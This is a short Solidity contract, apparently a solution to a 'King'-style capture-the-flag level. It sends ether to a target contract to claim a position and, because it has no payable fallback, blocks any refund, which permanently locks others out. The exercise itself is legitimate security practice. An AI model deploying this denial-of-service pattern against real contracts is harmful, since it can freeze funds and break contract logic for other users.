pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT

contract KingAttacker {

    constructor(address payable addr) payable {
        bool success = false;
        (success, ) = payable(addr).call{value: msg.value}("");
        require(success);
    }

}
